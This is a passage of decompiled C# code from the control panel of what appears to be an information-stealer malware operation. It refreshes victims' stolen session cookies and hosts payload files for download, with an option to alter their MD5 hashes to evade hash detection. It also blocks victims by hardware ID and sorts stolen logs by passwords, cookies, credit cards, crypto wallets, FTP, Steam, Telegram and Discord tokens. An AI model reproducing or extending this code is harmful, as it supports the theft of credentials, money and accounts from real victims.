                        string cookies = (RemoteClientSettings.SaveAsJSON ? list.CookiesToJSON() : string.Join(Environment.NewLine, list.Select((Meta.SharedModels.Cookie x) => x.ToText())));
                        System.IO.File.WriteAllText(saveFileDialog.FileName, cookies);
                        Invoke((MethodInvoker)delegate
                        {
                            ((AnimaTextBox)freshCookiesTb).Text = cookies;
                        });
                        MessageBox.Show(this, "Cookies are refreshed and saved to " + saveFileDialog.FileName);
                    }
                    else
                    {
                        MessageBox.Show(this, "Can't refresh cookies..Ooops...Token is invalid");
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.Message);
            }
        });
        ((Control)refreshCookiesBtn).Text = "Refresh";
        ((MetroSetButton)refreshCookiesBtn).Enabled = true;
    }

    private async void reloadBtn_Click(object sender, object e)
    {
        Environment.Exit(31231);
    }

    private async void addGuest_Click(object sender, object e)
    {
        try
        {
            if (!string.IsNullOrWhiteSpace(((AnimaTextBox)guestBuildID).Text))
            {
                if (!string.IsNullOrWhiteSpace(((AnimaTextBox)guestExpireDate).Text) && !DateTime.TryParseExact(((AnimaTextBox)guestExpireDate).Text.Trim(), "dd.MM.yyyy HH:mm", null, DateTimeStyles.None, out var _))
                {
                    MessageBox.Show("Invalid date format. Example: 02.05.2020 23:30");
                    return;
                }
                if (((IEnumerable<GuestLink>)LazyLoader<GuestLinksDb>.Instance.DbInstance.ToArray()).Any((Func<GuestLink, bool>)((GuestLink x) => (x.BuildID == ((AnimaTextBox)guestBuildID).Text) ? 1u : 0u)))
                {
                    MessageBox.Show(this, "Link with this BuildID already exist in database");
                    return;
                }
                GuestLink guestLink = new GuestLink
                {
                    BuildID = ((AnimaTextBox)guestBuildID).Text,
                    ExpiresTime = ((AnimaTextBox)guestExpireDate).Text
                };
                await Task.Factory.StartNew(delegate
                {
                    guestLink.ID = Md5Helper.GetMd5Hash(guestLink.BuildID + ProfileSettings.Login).ToLower();
                    LazyLoader<GuestLinksDb>.Instance.Save(guestLink);
                    Invoke((MethodInvoker)delegate
                    {
                        LazyLoader<GuestLinksDb>.Instance.DbInstance.Add(guestLink);
                    });
                });
                object obj = guestBuildID;
                string text = (((AnimaTextBox)guestExpireDate).Text = string.Empty);
                ((AnimaTextBox)obj).Text = text;
            }
            else
            {
                MessageBox.Show(this, "Please, enter a BuildID");
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private void guestLinksDgv_DoubleClick(object sender, object e)
    {
        if (((DataGridView)guestLinksDgv).SelectedRows.Count > 0)
        {
            string arg = "localhost";
            if (!string.IsNullOrWhiteSpace(SettingsOfPanel.Default.ServerIP))
            {
                arg = SettingsOfPanel.Default.ServerIP;
            }
            Process.Start($"http://{arg}:{((ServiceSettings)object_3).GuestPort}/?id={((DataGridView)guestLinksDgv).SelectedRows[0].Cells[0].Value}");
        }
    }

    private void bc_Opening(object sender, object e)
    {
        ((CancelEventArgs)e).Cancel = ((DataGridView)guestLinksDgv).SelectedRows.Count == 0;
    }

    private async void bd_Click(object sender, object e)
    {
        try
        {
            if (((DataGridView)guestLinksDgv).SelectedRows.Count <= 0)
            {
                return;
            }
            List<string> list = new List<string>();
            foreach (DataGridViewRow selectedRow in ((DataGridView)guestLinksDgv).SelectedRows)
            {
                list.Add((string)selectedRow.Cells[0].Value);
            }
            foreach (string selectedItem in list)
            {
                await Task.Factory.StartNew(delegate
                {
                    try
                    {
                        Invoke((MethodInvoker)delegate
                        {
                            LazyLoader<GuestLinksDb>.Instance.Delete((GuestLink x) => x.ID == selectedItem);
                        });
                    }
                    catch
                    {
                    }
                });
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private async void createDirectFileBtn_Click(object sender, object e)
    {
        try
        {
            object CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass161_0();
            ((_003C_003Ec__DisplayClass161_0)CS_0024_003C_003E8__locals0)._003C_003E4__this = this;
            ((_003C_003Ec__DisplayClass161_0)CS_0024_003C_003E8__locals0).filePath = string.Empty;
            await Task.Factory.StartNew(delegate
            {
                try
                {
                    _003C_003Ec__DisplayClass161_0 _003C_003Ec__DisplayClass161_ = (_003C_003Ec__DisplayClass161_0)CS_0024_003C_003E8__locals0;
                    OpenFileDialog ofd = new OpenFileDialog();
                    try
                    {
                        ofd.Filter = "All files (*.*)|*.*";
                        ofd.CheckPathExists = true;
                        ofd.InitialDirectory = Directory.GetCurrentDirectory();
                        ofd.RestoreDirectory = true;
                        ofd.Multiselect = false;
                        ((_003C_003Ec__DisplayClass161_0)CS_0024_003C_003E8__locals0)._003C_003E4__this.Invoke((MethodInvoker)delegate
                        {
                            if (ofd.ShowDialog(_003C_003Ec__DisplayClass161_._003C_003E4__this) == DialogResult.OK)
                            {
                                _003C_003Ec__DisplayClass161_.filePath = ofd.FileName;
                            }
                        });
                    }
                    finally
                    {
                        if (ofd != null)
                        {
                            ((IDisposable)ofd).Dispose();
                        }
                    }
                }
                catch (Exception ex2)
                {
                    MessageBox.Show(((_003C_003Ec__DisplayClass161_0)CS_0024_003C_003E8__locals0)._003C_003E4__this, "Error: " + ex2.Message);
                }
            });
            ((_003C_003Ec__DisplayClass161_0)CS_0024_003C_003E8__locals0).fileInfo = new FileInfo(((_003C_003Ec__DisplayClass161_0)CS_0024_003C_003E8__locals0).filePath);
            if (((_003C_003Ec__DisplayClass161_0)CS_0024_003C_003E8__locals0).fileInfo.Length > 2097152L)
            {
                MessageBox.Show(this, "Max size of file is 2 MB");
                return;
            }
            if (LazyLoader<GuestFilesDb>.Instance.DbInstance.ToArray().Any((GuestFile x) => x.Filename == ((_003C_003Ec__DisplayClass161_0)CS_0024_003C_003E8__locals0).fileInfo.Name))
            {
                MessageBox.Show(this, "Link with this filename already exist in database");
                return;
            }
            string text = Path.Combine(Directory.CreateDirectory(Path.Combine(Directory.GetCurrentDirectory(), "GuestFilesHost")).FullName, ((_003C_003Ec__DisplayClass161_0)CS_0024_003C_003E8__locals0).fileInfo.Name);
            if (!System.IO.File.Exists(text))
            {
                System.IO.File.Copy(((_003C_003Ec__DisplayClass161_0)CS_0024_003C_003E8__locals0).filePath, text);
            }
            GuestFile guestFile = new GuestFile
            {
                ChangeMd5 = ((MetroSetCheckBox)changeMd5Cb).Checked,
                Filename = ((_003C_003Ec__DisplayClass161_0)CS_0024_003C_003E8__locals0).fileInfo.Name
            };
            lock (LazyLoader<GuestFilesDb>.Instance.DataBaseLock)
            {
                if (LazyLoader<GuestFilesDb>.Instance.DbInstance.Count == 0)
                {
                    guestFile.ID = 1;
                }
                else
                {
                    guestFile.ID = LazyLoader<GuestFilesDb>.Instance.DbInstance[LazyLoader<GuestFilesDb>.Instance.DbInstance.Count - 1].ID + 1;
                }
                LazyLoader<GuestFilesDb>.Instance.Save(guestFile);
                Invoke((MethodInvoker)delegate
                {
                    LazyLoader<GuestFilesDb>.Instance.DbInstance.Add(guestFile);
                });
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private void guestFilesDgv_DoubleClick(object sender, object e)
    {
        if (((DataGridView)guestFilesDgv).SelectedRows.Count > 0)
        {
            string arg = "localhost";
            if (!string.IsNullOrWhiteSpace(SettingsOfPanel.Default.ServerIP))
            {
                arg = SettingsOfPanel.Default.ServerIP;
            }
            Process.Start($"http://{arg}:{((ServiceSettings)object_3).GuestPort}/{((DataGridView)guestFilesDgv).SelectedRows[0].Cells[1].Value}");
        }
    }

    private async void c2_Click(object sender, object e)
    {
        try
        {
            if (((DataGridView)guestFilesDgv).SelectedRows.Count <= 0)
            {
                return;
            }
            List<int> list = new List<int>();
            foreach (DataGridViewRow selectedRow in ((DataGridView)guestFilesDgv).SelectedRows)
            {
                list.Add((int)selectedRow.Cells[0].Value);
            }
            foreach (int selectedItem in list)
            {
                await Task.Factory.StartNew(delegate
                {
                    try
                    {
                        Invoke((MethodInvoker)delegate
                        {
                            LazyLoader<GuestFilesDb>.Instance.Delete((GuestFile x) => x.ID == selectedItem);
                        });
                    }
                    catch
                    {
                    }
                });
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private void c1_Opening(object sender, object e)
    {
        ((CancelEventArgs)e).Cancel = ((DataGridView)guestFilesDgv).SelectedRows.Count == 0;
    }

    private async void saveConfigBtn_Click(object sender, object e)
    {
        try
        {
            using SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "Sorter config files (*.scfg)|*.scfg";
            saveFileDialog.DefaultExt = ".scfg";
            saveFileDialog.CheckPathExists = true;
            saveFileDialog.InitialDirectory = Directory.GetCurrentDirectory();
            saveFileDialog.RestoreDirectory = true;
            if (saveFileDialog.ShowDialog(this) == DialogResult.OK)
            {
                SingleSearchParams singleSearchParams = new SingleSearchParams
                {
                    SetComment = ((AnimaTextBox)this.m_a9).Text,
                    SkipComment = ((AnimaTextBox)this.m_a7).Text,
                    BuildID = ((AnimaTextBox)singleIdSortTb).Text,
                    Comment = ((AnimaTextBox)singleCommentSortTb).Text,
                    OS = ((AnimaTextBox)singleOsSortTb).Text,
                    Country = ((AnimaTextBox)singleCountrySortTb).Text,
                    ContainsAFs = ((MetroSetCheckBox)singleAfSortCb).Checked,
                    ContainsCCs = ((MetroSetCheckBox)singleCCsSortCb).Checked,
                    ContainsFiles = ((MetroSetCheckBox)singleFilesSortCb).Checked,
                    ContainsFTPs = ((MetroSetCheckBox)singleFtpsSortCb).Checked,
                    CookieDomain = ((AnimaTextBox)singleCookieSortTb).Text,
                    PasswordDomain = ((AnimaTextBox)singlePasswordSortTb).Text,
                    ContainsWallets = ((MetroSetCheckBox)singleColdWalletSortCb).Checked,
                    SkipCookies = ((MetroSetCheckBox)ba).Checked,
                    SkipPasswords = ((MetroSetCheckBox)b8).Checked,
                    RefreshDD = ((MetroSetCheckBox)ea).Checked,
                    SkipChecked = ((MetroSetCheckBox)be).Checked,
                    FilesToSearch = ((AnimaTextBox)ef).Text,
                    ContainsSteam = ((MetroSetCheckBox)f1).Checked,
                    ContainsTelegram = ((MetroSetCheckBox)f3).Checked,
                    PasswordsMoreThan = (int)((NumericUpDown)passMoreThan).Value,
                    CookiesMoreThan = (int)((NumericUpDown)cookiesMoreThan).Value
                };
                singleSearchParams.LogFrom = ((DateTimePicker)d5).Value;
                singleSearchParams.LogTo = ((DateTimePicker)d6).Value;
                System.IO.File.WriteAllText(saveFileDialog.FileName, singleSearchParams.ToJSON());
                MessageBox.Show(this, "Saved to file '" + saveFileDialog.FileName + "'");
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private async void loadConfigBtn_Click(object sender, object e)
    {
        try
        {
            new SingleSearchParams();
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Sorter config files (*.scfg)|*.scfg";
            openFileDialog.CheckPathExists = true;
            openFileDialog.InitialDirectory = Directory.GetCurrentDirectory();
            openFileDialog.RestoreDirectory = true;
            openFileDialog.Multiselect = false;
            if (openFileDialog.ShowDialog(this) == DialogResult.OK)
            {
                SingleSearchParams singleSearchParams = System.IO.File.ReadAllText(openFileDialog.FileName).FromJSON<SingleSearchParams>();
                ((AnimaTextBox)this.m_a9).Text = singleSearchParams.SetComment;
                ((AnimaTextBox)this.m_a7).Text = singleSearchParams.SkipComment;
                ((AnimaTextBox)singleIdSortTb).Text = singleSearchParams.BuildID;
                ((AnimaTextBox)singleCommentSortTb).Text = singleSearchParams.Comment;
                ((AnimaTextBox)singleOsSortTb).Text = singleSearchParams.OS;
                ((AnimaTextBox)singleCountrySortTb).Text = singleSearchParams.Country;
                ((MetroSetCheckBox)singleAfSortCb).Checked = singleSearchParams.ContainsAFs;
                ((MetroSetCheckBox)singleCCsSortCb).Checked = singleSearchParams.ContainsCCs;
                ((MetroSetCheckBox)singleFilesSortCb).Checked = singleSearchParams.ContainsFiles;
                ((MetroSetCheckBox)singleFtpsSortCb).Checked = singleSearchParams.ContainsFTPs;
                ((AnimaTextBox)singleCookieSortTb).Text = singleSearchParams.CookieDomain;
                ((AnimaTextBox)singlePasswordSortTb).Text = singleSearchParams.PasswordDomain;
                ((MetroSetCheckBox)singleColdWalletSortCb).Checked = singleSearchParams.ContainsWallets;
                ((MetroSetCheckBox)ba).Checked = singleSearchParams.SkipCookies;
                ((MetroSetCheckBox)b8).Checked = singleSearchParams.SkipPasswords;
                ((MetroSetCheckBox)ea).Checked = singleSearchParams.RefreshDD;
                ((MetroSetCheckBox)be).Checked = singleSearchParams.SkipChecked;
                ((AnimaTextBox)ef).Text = singleSearchParams.FilesToSearch;
                ((MetroSetCheckBox)f1).Checked = singleSearchParams.ContainsSteam;
                ((MetroSetCheckBox)f3).Checked = singleSearchParams.ContainsTelegram;
                ((NumericUpDown)passMoreThan).Value = singleSearchParams.PasswordsMoreThan;
                ((NumericUpDown)cookiesMoreThan).Value = singleSearchParams.CookiesMoreThan;
                ((DateTimePicker)d5).Value = singleSearchParams.LogFrom;
                ((DateTimePicker)d6).Value = singleSearchParams.LogTo;
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && object_11 != null)
        {
            ((IDisposable)object_11).Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.object_11 = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Meta.MainPanel.Views.Old.Actions.MainFrm));
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle11 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle12 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle13 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle14 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle15 = new System.Windows.Forms.DataGridViewCellStyle();
        this.panel1 = new System.Windows.Forms.Panel();
        this.logContextMenu = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_11);
        this.systemInfoToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.viewersToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.passwordsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.cookiesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.autofillsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.creditCardsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.fTPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.filesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.saveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.runtimeExceptionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.d2 = new System.Windows.Forms.ToolStripMenuItem();
        this.blockHwidtoolStripMenuItem8 = new System.Windows.Forms.ToolStripMenuItem();
        this.ec = new System.Windows.Forms.ToolStripMenuItem();
        this.c8 = new System.Windows.Forms.ToolStripMenuItem();
        this.deleteToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.m_a3 = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_11);
        this.m_a4 = new System.Windows.Forms.ToolStripMenuItem();
        this.blackListCms_1 = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_11);
        this.d4 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.blackListCms_2 = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_11);
        this.deleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.blackListCms_3 = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_11);
        this.d3 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.topHeader = new System.Windows.Forms.Panel();
        this.reloadBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.c7 = new MetroSet_UI.Controls.MetroSetButton();
        this.minimizeBtn = new System.Windows.Forms.Label();
        this.mainTitle = new System.Windows.Forms.Label();
        this.closeBtn = new System.Windows.Forms.Label();
        this.c1 = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_11);
        this.c2 = new System.Windows.Forms.ToolStripMenuItem();
        this.bc = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_11);
        this.bd = new System.Windows.Forms.ToolStripMenuItem();
        this.c3 = new System.Windows.Forms.NotifyIcon((System.ComponentModel.IContainer)this.object_11);
        this.c4 = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_11);
        this.c5 = new System.Windows.Forms.ToolStripMenuItem();
        this.c6 = new System.Windows.Forms.ToolStripMenuItem();
        this.ed = new MetroSet_UI.Components.MetroSetToolTip();
        this.blackListCms_6 = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_11);
        this.toolStripMenuItem8 = new System.Windows.Forms.ToolStripMenuItem();
        this.blackListCms_7 = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_11);
        this.toolStripMenuItem9 = new System.Windows.Forms.ToolStripMenuItem();
        this.object_13 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_11);
        this.blackListCms_8 = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_11);
        this.toolStripMenuItem10 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem11 = new System.Windows.Forms.ToolStripMenuItem();
        this.dashboardTabs = new Meta.MainPanel.Data.UI.AetherTabControl();
        this.logsTab = new System.Windows.Forms.TabPage();
        this.totalSelectedLogs = new System.Windows.Forms.Label();
        this.label50 = new System.Windows.Forms.Label();
        this.df = new System.Windows.Forms.Label();
        this.e0 = new System.Windows.Forms.Label();
        this.dd = new System.Windows.Forms.Label();
        this.de = new System.Windows.Forms.Label();
        this.db = new System.Windows.Forms.Label();
        this.dc = new System.Windows.Forms.Label();
        this.d9 = new GuiLib.AnimaTextBox();
        this.da = new MetroSet_UI.Controls.MetroSetButton();
        this.d7 = new MetroSet_UI.Controls.MetroSetButton();
        this.d8 = new MetroSet_UI.Controls.MetroSetButton();
        this.searchBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.searchTb = new GuiLib.AnimaTextBox();
        this.label4 = new System.Windows.Forms.Label();
        this.clearBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.saveBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.setCommentBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.commentTb = new GuiLib.AnimaTextBox();
        this.label1 = new System.Windows.Forms.Label();
        this.logsListView = new System.Windows.Forms.DataGridView();
        this.iDDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.hWIDDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.iPDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.buildIDDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.usernameDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.isProcessElevatedDataGridViewCheckBoxColumn = new System.Windows.Forms.DataGridViewCheckBoxColumn();
        this.currentLanguageDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.monitorSizeDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.logDateDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.countryDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.SeenBefore = new System.Windows.Forms.DataGridViewCheckBoxColumn();
        this.Checked = new System.Windows.Forms.DataGridViewCheckBoxColumn();
        this.locationDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.timeZoneDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.screenshotDataGridViewImageColumn = new System.Windows.Forms.DataGridViewImageColumn();
        this.Comment = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Creds = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.pDDDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.cDDDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Credentials = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.object_16 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_11);
        this.statisticTab = new System.Windows.Forms.TabPage();
        this.metroSetDivider20 = new MetroSet_UI.Controls.MetroSetDivider();
        this.activeConnections = new System.Windows.Forms.Label();
        this.metroSetDivider6 = new MetroSet_UI.Controls.MetroSetDivider();
        this.metroSetDivider7 = new MetroSet_UI.Controls.MetroSetDivider();
        this.e1 = new MetroSet_UI.Controls.MetroSetDivider();
        this.metroSetDivider8 = new MetroSet_UI.Controls.MetroSetDivider();
        this.e4 = new MetroSet_UI.Controls.MetroSetDivider();
        this.e2 = new System.Windows.Forms.ListBox();
        this.e3 = new MetroSet_UI.Controls.MetroSetLabel();
        this.resetStatsBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.coldWalletLbl = new System.Windows.Forms.Label();
        this.coldWalletCounter = new System.Windows.Forms.Label();
        this.top10CountriesLb = new System.Windows.Forms.ListBox();
        this.top10countryLbl = new MetroSet_UI.Controls.MetroSetLabel();
        this.top10osLb = new System.Windows.Forms.ListBox();
        this.top10osLbl = new MetroSet_UI.Controls.MetroSetLabel();
        this.ftpLbl = new System.Windows.Forms.Label();
        this.ftpsCounter = new System.Windows.Forms.Label();
        this.filesLbl = new System.Windows.Forms.Label();
        this.filesCounter = new System.Windows.Forms.Label();
        this.metroSetDivider5 = new MetroSet_UI.Controls.MetroSetDivider();
        this.cardsLbl = new System.Windows.Forms.Label();
        this.creditcardsCounter = new System.Windows.Forms.Label();
        this.metroSetDivider4 = new MetroSet_UI.Controls.MetroSetDivider();
        this.autofillsLbl = new System.Windows.Forms.Label();
        this.autofillsCounter = new System.Windows.Forms.Label();
        this.metroSetDivider3 = new MetroSet_UI.Controls.MetroSetDivider();
        this.cookiesLbl = new System.Windows.Forms.Label();
        this.cookiesCounter = new System.Windows.Forms.Label();
        this.metroSetDivider2 = new MetroSet_UI.Controls.MetroSetDivider();
        this.passwordsLbl = new System.Windows.Forms.Label();
        this.passwordsCounter = new System.Windows.Forms.Label();
        this.metroSetDivider1 = new MetroSet_UI.Controls.MetroSetDivider();
        this.label56 = new System.Windows.Forms.Label();
        this.guestLinkTab = new System.Windows.Forms.TabPage();
        this.changeMd5Cb = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.label36 = new System.Windows.Forms.Label();
        this.createDirectFileBtn = new System.Windows.Forms.Button();
        this.guestFilesDgv = new System.Windows.Forms.DataGridView();
        this.iDDataGridViewTextBoxColumn1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.filenameDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.changeMd5DataGridViewCheckBoxColumn = new System.Windows.Forms.DataGridViewCheckBoxColumn();
        this.object_18 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_11);
        this.metroSetDivider16 = new MetroSet_UI.Controls.MetroSetDivider();
        this.guestExpireDate = new GuiLib.AnimaTextBox();
        this.label58 = new System.Windows.Forms.Label();
        this.guestBuildID = new GuiLib.AnimaTextBox();
        this.label60 = new System.Windows.Forms.Label();
        this.addGuest = new System.Windows.Forms.Button();
        this.guestLinksDgv = new System.Windows.Forms.DataGridView();
        this.iDDataGridViewTextBoxColumn2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.buildIDDataGridViewTextBoxColumn1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.expiresTimeDataGridViewTextBoxColumn = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.object_19 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_11);
        this.sorterTab = new System.Windows.Forms.TabPage();
        this.loadConfigBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.saveConfigBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.cookiesMoreThan = new System.Windows.Forms.NumericUpDown();
        this.label54 = new System.Windows.Forms.Label();
        this.passMoreThan = new System.Windows.Forms.NumericUpDown();
        this.label55 = new System.Windows.Forms.Label();
        this.saveDiscordTokensBtn = new MetroSet_UI.Controls.MetroSetButton();
        this.f5 = new GuiLib.AnimaTextBox();
        this.f6 = new System.Windows.Forms.Label();
        this.ef = new GuiLib.AnimaTextBox();
        this.f0 = new System.Windows.Forms.Label();
        this.f1 = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.f2 = new System.Windows.Forms.Label();
        this.f3 = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.f4 = new System.Windows.Forms.Label();
        this.ee = new MetroSet_UI.Controls.MetroSetButton();
        this.e8 = new MetroSet_UI.Controls.MetroSetButton();
        this.e9 = new MetroSet_UI.Controls.MetroSetButton();
        this.d6 = new System.Windows.Forms.DateTimePicker();
        this.d5 = new System.Windows.Forms.DateTimePicker();
        this.be = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.bf = new System.Windows.Forms.Label();
        this.ea = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.eb = new System.Windows.Forms.Label();
        this.b8 = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.b9 = new System.Windows.Forms.Label();
        this.ba = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.bb = new System.Windows.Forms.Label();
        this.m_b1 = new MetroSet_UI.Controls.MetroSetDivider();
        this.m_ab = new MetroSet_UI.Controls.MetroSetLabel();
        this.m_ac = new MetroSet_UI.Controls.MetroSetLabel();
        this.m_ad = new MetroSet_UI.Controls.MetroSetButton();
        this.m_ae = new GuiLib.AnimaTextBox();
        this.m_af = new MetroSet_UI.Controls.MetroSetLabel();
        this.m_b0 = new MetroSet_UI.Controls.MetroSetLabel();
        this.m_a9 = new GuiLib.AnimaTextBox();
        this.m_aa = new System.Windows.Forms.Label();
        this.m_a7 = new GuiLib.AnimaTextBox();
        this.m_a8 = new System.Windows.Forms.Label();
        this.m_a1 = new System.Windows.Forms.Label();
        this.m_a2 = new System.Windows.Forms.Label();
        this.singleColdWalletSortCb = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.label3 = new System.Windows.Forms.Label();
        this.currentDomainLbl = new MetroSet_UI.Controls.MetroSetLabel();
        this.metroSetLabel2 = new MetroSet_UI.Controls.MetroSetLabel();
        this.sortDomain = new MetroSet_UI.Controls.MetroSetButton();
        this.domainsTb = new GuiLib.AnimaTextBox();
        this.domainSorterLbl = new MetroSet_UI.Controls.MetroSetLabel();
        this.metroSetLabel3 = new MetroSet_UI.Controls.MetroSetLabel();
        this.singleOsSortTb = new GuiLib.AnimaTextBox();
        this.label17 = new System.Windows.Forms.Label();
        this.singleFilesSortCb = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.label16 = new System.Windows.Forms.Label();
        this.singleFtpsSortCb = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.label15 = new System.Windows.Forms.Label();
        this.singleAfSortCb = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.label14 = new System.Windows.Forms.Label();
        this.singleCCsSortCb = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.label13 = new System.Windows.Forms.Label();
        this.singleCountrySortTb = new GuiLib.AnimaTextBox();
        this.singleSort = new MetroSet_UI.Controls.MetroSetButton();
        this.singleCookieSortTb = new GuiLib.AnimaTextBox();
        this.label12 = new System.Windows.Forms.Label();
        this.metroSetDivider12 = new MetroSet_UI.Controls.MetroSetDivider();
        this.singlePasswordSortTb = new GuiLib.AnimaTextBox();
        this.label11 = new System.Windows.Forms.Label();
        this.singleCommentSortTb = new GuiLib.AnimaTextBox();
        this.label10 = new System.Windows.Forms.Label();
